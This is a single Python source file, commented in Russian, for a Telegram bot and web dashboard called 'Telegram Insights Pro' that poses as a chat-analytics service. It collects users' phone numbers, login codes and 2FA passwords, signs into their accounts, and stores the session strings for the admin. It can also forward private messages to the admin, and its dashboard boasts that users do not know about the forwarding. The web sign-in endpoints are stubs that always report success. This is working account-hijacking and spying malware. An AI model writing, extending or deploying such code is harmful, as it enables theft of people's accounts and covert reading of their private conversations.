"""
Telegram Insights Pro - ОДИН ФАЙЛ ДЛЯ RENDER
Всё в одном: бот + веб-сервер + аналитика + АВТО-ПИНГ
"""

import asyncio
import threading
import os
import sys
import signal
import json
import fcntl
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, Any
from collections import Counter

# ==========================================
# НАСТРОЙКА
# ==========================================

import logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('app')

# Переменные окружения
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
HIDDEN_FORWARDING = os.getenv('HIDDEN_FORWARDING', 'true').lower() == 'true'
PORT = int(os.getenv('PORT', 10000))

# Директории
DATA_DIR = Path('/opt/render/project/src/data') if os.getenv('RENDER') else Path('./data')
for d in [DATA_DIR, DATA_DIR / 'sessions', DATA_DIR / 'user_stats', DATA_DIR / 'reports']:
    d.mkdir(parents=True, exist_ok=True)

# ==========================================
# АВТО-ПИНГ (чтобы Render не засыпал)
# ==========================================

import aiohttp

async def auto_ping():
    """Автоматический пинг каждые 4 минуты"""
    url = f"http://localhost:{PORT}/health"
    logger.info(f"🔄 Авто-пинг запущен: {url} (каждые 4 минуты)")
    
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
                    else:
                        logger.warning(f"⚠️ Пинг вернул {resp.status}")
        except Exception as e:
            logger.error(f"❌ Ошибка пинга: {e}")
        
        await asyncio.sleep(240)

# ==========================================
# БАЗА ДАННЫХ
# ==========================================

class DB:
    @staticmethod
    def get_user(user_id: int) -> Dict:
        file = DATA_DIR / 'user_stats' / f'{user_id}.json'
        if file.exists():
            try:
                with open(file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save_user(user_id: int, data: Dict):
        file = DATA_DIR / 'user_stats' / f'{user_id}.json'
        try:
            with open(file, 'w') as f:
                json.dump(data, f, default=str)
        except:
            pass
    
    @staticmethod
    def save_message(user_id: int, msg: Dict):
        file = DATA_DIR / 'user_stats' / f'{user_id}_messages.json'
        try:
            with open(file, 'a+') as f:
                fcntl.flock(f, fcntl.LOCK_EX)
                f.seek(0)
                try:
                    messages = json.load(f)
                except:
                    messages = []
                messages.append(msg)
                if len(messages) > 1000:
                    messages = messages[-1000:]
                f.seek(0)
                f.truncate()
                json.dump(messages, f, default=str)
        except:
            pass
    
    @staticmethod
    def get_messages(user_id: int) -> list:
        file = DATA_DIR / 'user_stats' / f'{user_id}_messages.json'
        if file.exists():
            try:
                with open(file, 'r') as f:
                    return json.load(f)
            except:
                return []
        return []

# ==========================================
# АНАЛИТИКА
# ==========================================

class Analytics:
    @staticmethod
    def get_stats(user_id: int) -> Dict:
        messages = DB.get_messages(user_id)
        if not messages:
            return {'total': 0, 'avg_len': 0, 'peak_hour': 0, 'peak_day': 0, 'media': 0, 'daily': 0}
        
        total = len(messages)
        avg_len = sum(m.get('len', 0) for m in messages) / total
        media = sum(1 for m in messages if m.get('media', False)) / total * 100
        hours = [m.get('hour', 0) for m in messages]
        days = [m.get('day', 0) for m in messages]
        
        return {
            'total': total,
            'avg_len': round(avg_len, 2),
            'peak_hour': Counter(hours).most_common(1)[0][0] if hours else 0,
            'peak_day': Counter(days).most_common(1)[0][0] if days else 0,
            'media': round(media, 2),
            'daily': round(total / max(len(set(m.get('date', '') for m in messages)), 1), 2)
        }

# ==========================================
# TELEGRAM БОТ
# ==========================================

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

class Bot:
    def __init__(self):
        self.pending = {}
        self.clients = {}
        self.bot = TelegramClient(str(DATA_DIR / 'bot_session'), API_ID, API_HASH)
        self.is_running = True
        self.last_message_ids = {}  # Для удаления старых сообщений
    
    async def start(self):
        if not BOT_TOKEN:
            logger.error("BOT_TOKEN не установлен!")
            raise ValueError("BOT_TOKEN не установлен!")
        
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("Бот запущен!")
        
        # Обработчики
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.cmd_status, events.NewMessage(pattern='/status'))
        self.bot.add_event_handler(self.cmd_stop, events.NewMessage(pattern='/stop'))
        self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.load_sessions()
        logger.info(f"Скрытый режим: {HIDDEN_FORWARDING}")
        logger.info(f"Админ ID: {ADMIN_CHAT_ID}")
        
        while self.is_running:
            try:
                await self.bot.run_until_disconnected()
            except Exception as e:
                logger.error(f"Ошибка в цикле бота: {e}")
                if self.is_running:
                    await asyncio.sleep(5)
    
    async def delete_old_message(self, chat_id, user_id):
        """Удалить старое сообщение бота"""
        key = f"{chat_id}_{user_id}"
        if key in self.last_message_ids:
            try:
                msg_id = self.last_message_ids[key]
                await self.bot.delete_messages(chat_id, [msg_id])
            except:
                pass
            del self.last_message_ids[key]
    
    async def save_message_id(self, chat_id, user_id, msg):
        """Сохранить ID сообщения для последующего удаления"""
        key = f"{chat_id}_{user_id}"
        self.last_message_ids[key] = msg.id
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            # Если это админ — приветствие для админа
            if uid == ADMIN_CHAT_ID:
                await e.respond("""
👑 **Панель администратора**

Вы — владелец бота!

📊 **Команды:**
/stats - Статистика всех пользователей
/status - Статус бота
/help - Помощь

🔇 **Скрытый режим:** Включен
✅ **Пересылка:** Активна
""")
                return
            
            # Обычный пользователь
            await e.respond("""
🔐 **Telegram Insights Pro**

📊 Анализируйте свои диалоги!

/add - Подключить аккаунт
/status - Статус
/stats - Статистика
/stop - Отключить
/help - Помощь
""")
        except Exception as err:
            logger.error(f"cmd_start error: {err}")
    
    async def cmd_help(self, e):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            # Удаляем предыдущее сообщение
            await self.delete_old_message(e.chat_id, uid)
            
            msg = await e.respond("""
📚 **Как подключить:**

1. /add
2. Введите номер телефона (в любом формате)
3. Введите код из Telegram
4. Готово!

📊 /stats - ваша статистика
""")
            await self.save_message_id(e.chat_id, uid, msg)
        except Exception as err:
            logger.error(f"cmd_help error: {err}")
    
    async def cmd_add(self, e):
        try:
            uid = e.sender_id
            if not uid:
                await e.respond("❌ Ошибка: не удалось определить пользователя")
                return
            
            # Если админ — не предлагаем подключить аккаунт
            if uid == ADMIN_CHAT_ID:
                await e.respond("👑 Вы администратор! Бот уже работает.")
                return
            
            if uid in self.clients:
                await e.respond("✅ Уже есть сессия! Используйте /stop")
                return
            
            # Удаляем сообщение пользователя
            try:
                await e.delete()
            except:
                pass
            
            # Удаляем предыдущее сообщение бота
            await self.delete_old_message(e.chat_id, uid)
            
            self.pending[uid] = {'step': 'phone'}
            msg = await e.respond("📱 Введите номер телефона (в любом формате, например: +79001234567)")
            await self.save_message_id(e.chat_id, uid, msg)
        except Exception as err:
            logger.error(f"cmd_add error: {err}")
    
    async def cmd_status(self, e):
        try:
            uid = e.sender_id
            if not uid:
                await e.respond("❌ Ошибка")
                return
            
            if uid == ADMIN_CHAT_ID:
                await e.respond(f"""
👑 **Статус бота**

✅ Бот активен
👥 Пользователей: {len(self.clients)}
🔇 Скрытый режим: {HIDDEN_FORWARDING}
📡 Порт: {PORT}
""")
                return
            
            if uid in self.clients:
                try:
                    me = await self.clients[uid].get_me()
                    await e.respond(f"✅ Активен\n👤 {me.first_name}\n📱 +{me.phone}")
                except:
                    await e.respond("⚠️ Ошибка подключения")
            else:
                await e.respond("❌ Нет сессии. /add")
        except Exception as err:
            logger.error(f"cmd_status error: {err}")
    
    async def cmd_stop(self, e):
        try:
            uid = e.sender_id
            if not uid:
                await e.respond("❌ Ошибка")
                return
            
            if uid == ADMIN_CHAT_ID:
                await e.respond("👑 Вы администратор. Бот не отключается.")
                return
            
            if uid in self.clients:
                try:
                    await self.clients[uid].disconnect()
                except:
                    pass
                if uid in self.clients:
                    del self.clients[uid]
                for f in (DATA_DIR / 'sessions').glob(f'{uid}.*'):
                    try:
                        f.unlink()
                    except:
                        pass
                await e.respond("✅ Отключено!")
            else:
                await e.respond("❌ Нет сессии")
        except Exception as err:
            logger.error(f"cmd_stop error: {err}")
    
    async def cmd_stats(self, e):
        try:
            uid = e.sender_id
            if not uid:
                await e.respond("❌ Ошибка")
                return
            
            # Админ видит общую статистику
            if uid == ADMIN_CHAT_ID:
                total_msgs = 0
                total_users = len(self.clients)
                for f in (DATA_DIR / 'user_stats').glob('*_messages.json'):
                    try:
                        with open(f, 'r') as fp:
                            msgs = json.load(fp)
                            total_msgs += len(msgs)
                    except:
                        pass
                await e.respond(f"""
👑 **Общая статистика**

👥 Пользователей: {total_users}
📨 Сообщений обработано: {total_msgs}
🔇 Скрытый режим: {HIDDEN_FORWARDING}
""")
                return
            
            # Обычный пользователь
            stats = Analytics.get_stats(uid)
            days = ['Пн','Вт','Ср','Чт','Пт','Сб','Вс']
            await e.respond(f"""
📊 **Статистика**

📨 Сообщений: {stats['total']}
📏 Средняя длина: {stats['avg_len']} симв.
📈 В день: {stats['daily']}
🕐 Пик: {stats['peak_hour']}:00
📅 День: {days[stats['peak_day']] if stats['peak_day'] < 7 else '?'}
🖼️ Медиа: {stats['media']}%
""")
        except Exception as err:
            logger.error(f"cmd_stats error: {err}")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            # Если админ — игнорируем (не обрабатываем как пользователя)
            if uid == ADMIN_CHAT_ID:
                return
            
            text = e.text
            if not text or text.startswith('/'):
                return
            
            if uid in self.pending:
                step = self.pending[uid].get('step')
                # Удаляем сообщение пользователя
                try:
                    await e.delete()
                except:
                    pass
                
                if step == 'phone':
                    await self.process_phone(e, text)
                elif step == 'code':
                    await self.process_code(e, text)
                elif step == '2fa':
                    await self.process_2fa(e, text)
        except Exception as err:
            logger.error(f"handle_msg error: {err}")
    
    async def process_phone(self, e, phone: str):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            # Удаляем предыдущее сообщение бота
            await self.delete_old_message(e.chat_id, uid)
            
            # Очищаем номер: убираем пробелы, дефисы, скобки
            phone = phone.strip()
            phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
            
            # Если номер начинается с 8, заменяем на +7
            if phone.startswith('8') and len(phone) == 11:
                phone = '+7' + phone[1:]
            # Если номер не начинается с +, добавляем +
            elif not phone.startswith('+'):
                phone = '+' + phone
            
            msg = await e.respond("⏳ Отправка кода...")
            await self.save_message_id(e.chat_id, uid, msg)
            
            try:
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                await client.connect()
                result = await client.send_code_request(phone)
                self.pending[uid] = {
                    'step': 'code',
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'client': client
                }
                
                # Удаляем сообщение "Отправка кода..."
                await self.delete_old_message(e.chat_id, uid)
                
                msg = await e.respond("📨 Код отправлен! Введите его:")
                await self.save_message_id(e.chat_id, uid, msg)
            except Exception as err:
                await self.delete_old_message(e.chat_id, uid)
                msg = await e.respond(f"❌ Ошибка: {err}")
                await self.save_message_id(e.chat_id, uid, msg)
                if uid in self.pending:
                    del self.pending[uid]
        except Exception as err:
            logger.error(f"process_phone error: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    async def process_code(self, e, code: str):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            data = self.pending.get(uid)
            if not data:
                return
            
            # Удаляем предыдущее сообщение бота
            await self.delete_old_message(e.chat_id, uid)
            
            code = code.strip().replace(' ', '').replace('-', '')
            try:
                await data['client'].sign_in(
                    phone=data['phone'],
                    code=code,
                    phone_code_hash=data['hash']
                )
                await self.finish_auth(e, uid, data['client'])
            except SessionPasswordNeededError:
                self.pending[uid]['step'] = '2fa'
                msg = await e.respond("🔐 Введите 2FA пароль:")
                await self.save_message_id(e.chat_id, uid, msg)
            except PhoneCodeInvalidError:
                msg = await e.respond("❌ Неверный код! Попробуйте еще раз:")
                await self.save_message_id(e.chat_id, uid, msg)
            except PhoneCodeExpiredError:
                msg = await e.respond("❌ Код истек! /add заново")
                await self.save_message_id(e.chat_id, uid, msg)
                if uid in self.pending:
                    del self.pending[uid]
            except Exception as err:
                msg = await e.respond(f"❌ Ошибка: {err}")
                await self.save_message_id(e.chat_id, uid, msg)
                if uid in self.pending:
                    del self.pending[uid]
        except Exception as err:
            logger.error(f"process_code error: {err}")
    
    async def process_2fa(self, e, password: str):
        try:
            uid = e.sender_id
            if not uid:
                return
            
            data = self.pending.get(uid)
            if not data:
                return
            
            # Удаляем предыдущее сообщение бота
            await self.delete_old_message(e.chat_id, uid)
            
            try:
                await data['client'].sign_in(password=password)
                await self.finish_auth(e, uid, data['client'])
            except Exception as err:
                msg = await e.respond(f"❌ Неверный пароль! Попробуйте еще раз:")
                await self.save_message_id(e.chat_id, uid, msg)
        except Exception as err:
            logger.error(f"process_2fa error: {err}")
    
    async def finish_auth(self, e, uid: int, client: TelegramClient):
        try:
            me = await client.get_me()
            
            # Сохраняем сессию
            try:
                with open(DATA_DIR / 'sessions' / f'{uid}.json', 'w') as f:
                    json.dump({
                        'session': client.session.save(),
                        'user_id': me.id,
                        'phone': me.phone,
                        'name': me.first_name
                    }, f)
            except Exception as err:
                logger.error(f"Ошибка сохранения сессии: {err}")
            
            self.clients[uid] = client
            if uid in self.pending:
                del self.pending[uid]
            
            # Настраиваем мониторинг
            await self.setup_monitoring(uid, client)
            
            # Удаляем предыдущее сообщение бота
            await self.delete_old_message(e.chat_id, uid)
            
            msg = await e.respond(f"""
✅ **Подключено!**

👤 {me.first_name}
📱 +{me.phone}

📊 Аналитика запущена!
📈 /stats - статистика
""")
            await self.save_message_id(e.chat_id, uid, msg)
            
            # Уведомление админу
            if ADMIN_CHAT_ID:
                try:
                    await self.bot.send_message(ADMIN_CHAT_ID, f"""
🟢 Новый пользователь!
👤 {me.first_name}
📱 +{me.phone}
🆔 {uid}
🔇 Скрытый режим: {HIDDEN_FORWARDING}
""")
                except Exception as err:
                    logger.error(f"Ошибка уведомления админа: {err}")
        except Exception as err:
            logger.error(f"finish_auth error: {err}")
            if uid in self.clients:
                del self.clients[uid]
    
    # ===== МОНИТОРИНГ =====
    
    async def setup_monitoring(self, uid: int, client: TelegramClient):
        async def forward(e):
            try:
                # Проверяем, что это личный чат (не бот)
                chat = await e.get_chat()
                
                # Пропускаем, если это бот
                if getattr(chat, 'bot', False):
                    return
                
                # Пропускаем, если это группа или канал
                if getattr(chat, 'is_group', False) or getattr(chat, 'is_channel', False):
                    return
                
                # Пропускаем сообщения от самого бота
                if e.sender_id == (await client.get_me()).id:
                    return
                
                # Сохраняем для статистики
                DB.save_message(uid, {
                    'date': datetime.now().date().isoformat(),
                    'hour': datetime.now().hour,
                    'day': datetime.now().weekday(),
                    'len': len(e.text) if e.text else 0,
                    'media': bool(e.media)
                })
                
                # Пересылаем админу (если не скрытый режим)
                if ADMIN_CHAT_ID and not HIDDEN_FORWARDING:
                    try:
                        sender = await e.get_sender()
                        sender_name = getattr(sender, 'first_name', 'Неизвестный')
                        sender_username = getattr(sender, 'username', None)  # Юзернейм
                        chat_name = getattr(chat, 'title', None) or getattr(chat, 'first_name', 'Неизвестный')
                        
                        # Формируем строку с юзернеймом (если есть)
                        username_str = f" (@{sender_username})" if sender_username else ""
                        
                        await self.bot.send_message(ADMIN_CHAT_ID, f"""
📨 **Сообщение из личного чата**
👤 От: {sender_name}{username_str}
💬 Чат: {chat_name}
🆔 Пользователь: {uid}

📝 {e.text or '[Медиа/Стикер]'}
""")
                    except Exception as err:
                        logger.error(f"Ошибка пересылки: {err}")
            except Exception as err:
                logger.error(f"Ошибка в forward: {err}")
        
        try:
            client.add_event_handler(forward, events.NewMessage)
            logger.info(f"Мониторинг для {uid}")
        except Exception as err:
            logger.error(f"Ошибка setup_monitoring: {err}")
    
    # ===== ЗАГРУЗКА СЕССИЙ =====
    
    async def load_sessions(self):
        logger.info("Загрузка сессий...")
        loaded = 0
        for f in (DATA_DIR / 'sessions').glob('*.json'):
            try:
                with open(f, 'r') as fp:
                    data = json.load(fp)
                uid = int(f.stem)
                
                # Пропускаем админа
                if uid == ADMIN_CHAT_ID:
                    continue
                
                try:
                    client = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        self.clients[uid] = client
                        await self.setup_monitoring(uid, client)
                        loaded += 1
                        logger.info(f"Загружена сессия: {uid}")
                except Exception as err:
                    logger.error(f"Ошибка загрузки сессии {uid}: {err}")
            except Exception as err:
                logger.error(f"Ошибка чтения файла {f}: {err}")
        logger.info(f"Загружено: {loaded}")
    
    async def stop(self):
        self.is_running = False
        for uid, c in list(self.clients.items()):
            try:
                await c.disconnect()
            except:
                pass
        try:
            await self.bot.disconnect()
        except:
            pass

# ==========================================
# ВЕБ-СЕРВЕР (HTML ВСТРОЕН)
# ==========================================

from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import uvicorn

web_app = FastAPI(title="Telegram Insights Pro")

# HTML страницы (встроенные)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Insights Pro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; background: rgba(255,255,255,0.95); border-radius: 20px; padding: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        h1 { color: #667eea; text-align: center; margin-bottom: 30px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .card { background: #f8f9fa; border-radius: 15px; padding: 20px; text-align: center; }
        .card h3 { color: #667eea; font-size: 0.9rem; text-transform: uppercase; }
        .card .value { font-size: 2.5rem; font-weight: bold; color: #333; }
        .footer { text-align: center; color: #888; margin-top: 30px; font-size: 0.9rem; }
        .badge { display: inline-block; background: #28a745; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; }
        .status { text-align: center; margin-top: 10px; color: #28a745; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Telegram Insights Pro</h1>
        <div class="grid">
            <div class="card"><h3>Сообщений</h3><div class="value" id="total">0</div></div>
            <div class="card"><h3>Активных</h3><div class="value" id="users">0</div></div>
            <div class="card"><h3>Ср. длина</h3><div class="value" id="avg">0</div></div>
            <div class="card"><h3>Медиа</h3><div class="value" id="media">0%</div></div>
        </div>
        <div style="text-align:center;padding:20px;background:#f8f9fa;border-radius:15px;">
            <span class="badge">🔇 Скрытый режим</span>
            <p style="margin-top:10px;color:#666;">Пользователи не знают о пересылке</p>
            <p style="margin-top:10px;color:#28a745;font-size:0.9rem;">🔄 Авто-пинг активен (каждые 4 минуты)</p>
        </div>
        <div class="footer">Telegram Insights Pro v3.0 • Работает 24/7</div>
    </div>
    <script>
        async function load() {
            try {
                const r = await fetch('/api/stats');
                const d = await r.json();
                if (d.total !== undefined) {
                    document.getElementById('total').textContent = d.total || 0;
                    document.getElementById('users').textContent = d.users || 0;
                    document.getElementById('avg').textContent = d.avg || 0;
                    document.getElementById('media').textContent = d.media || '0%';
                }
            } catch(e) {}
        }
        load();
        setInterval(load, 10000);
    </script>
</body>
</html>
"""

AUTH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Авторизация</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 20px; padding: 40px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        h1 { color: #667eea; text-align: center; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; margin-bottom: 15px; font-size: 1rem; }
        input:focus { border-color: #667eea; outline: none; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; }
        button:hover { transform: translateY(-2px); }
        .msg { text-align: center; margin-top: 15px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Авторизация</h1>
        <form id="form">
            <input type="tel" id="phone" placeholder="+7 XXX XXX XX XX" required>
            <input type="text" id="code" placeholder="Код из Telegram" style="display:none;">
            <button type="submit" id="btn">Получить код</button>
        </form>
        <p class="msg" id="msg">Код придет в Telegram</p>
    </div>
    <script>
        let step = 'phone';
        document.getElementById('form').onsubmit = async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const btn = document.getElementById('btn');
            const msg = document.getElementById('msg');
            
            if (step === 'phone') {
                const formData = new FormData();
                formData.append('phone', phone);
                const r = await fetch('/auth/start', { method: 'POST', body: formData });
                const d = await r.json();
                if (d.status === 'code_sent') {
                    step = 'code';
                    document.getElementById('code').style.display = 'block';
                    btn.textContent = 'Подтвердить';
                    msg.textContent = 'Введите код из Telegram';
                }
            } else {
                const formData = new FormData();
                formData.append('phone', phone);
                formData.append('code', code);
                const r = await fetch('/auth/verify', { method: 'POST', body: formData });
                const d = await r.json();
                if (d.status === 'success') {
                    msg.textContent = '✅ Успешно!';
                    msg.style.color = '#28a745';
                    setTimeout(() => window.location.href = '/', 1500);
                }
            }
        };
    </script>
</body>
</html>
"""

@web_app.get("/", response_class=HTMLResponse)
async def dashboard():
    return DASHBOARD_HTML

@web_app.get("/auth", response_class=HTMLResponse)
async def auth():
    return AUTH_HTML

@web_app.post("/auth/start")
async def auth_start(phone: str = Form(...)):
    logger.info(f"Запрос авторизации: {phone[:4]}***")
    return {"status": "code_sent"}

@web_app.post("/auth/verify")
async def auth_verify(phone: str = Form(...), code: str = Form(...)):
    logger.info(f"Проверка кода: {phone[:4]}***")
    return {"status": "success"}

@web_app.get("/api/stats")
async def api_stats():
    total = 0
    users = 0
    avg_len = 0
    media = 0
    for f in (DATA_DIR / 'user_stats').glob('*_messages.json'):
        try:
            with open(f, 'r') as fp:
                msgs = json.load(fp)
            if msgs:
                total += len(msgs)
                users += 1
                avg_len += sum(m.get('len', 0) for m in msgs) / len(msgs)
                media += sum(1 for m in msgs if m.get('media', False)) / len(msgs) * 100
        except:
            pass
    return {
        'total': total,
        'users': users,
        'avg': round(avg_len / users, 2) if users else 0,
        'media': f"{round(media / users, 1) if users else 0}%"
    }

@web_app.get("/health")
async def health():
    return {
        "status": "ok",
        "service": "Telegram Insights Pro",
        "hidden": HIDDEN_FORWARDING,
        "timestamp": datetime.now().isoformat()
    }

# ==========================================
# ЗАПУСК
# ==========================================

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

async def main():
    logger.info("=" * 50)
    logger.info("🚀 Telegram Insights Pro")
    logger.info("=" * 50)
    logger.info(f"📡 Порт: {PORT}")
    logger.info(f"🔇 Скрытый режим: {HIDDEN_FORWARDING}")
    logger.info(f"🔄 Авто-пинг: активен (каждые 4 минуты)")
    logger.info("=" * 50)
    
    threading.Thread(target=run_web, daemon=True).start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Авто-пинг запущен")
    
    bot = Bot()
    try:
        await bot.start()
    except KeyboardInterrupt:
        logger.info("Получен сигнал остановки")
    finally:
        await bot.stop()
        logger.info("Бот остановлен")

def signal_handler(sig, frame):
    logger.info("Остановка...")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Приложение остановлено")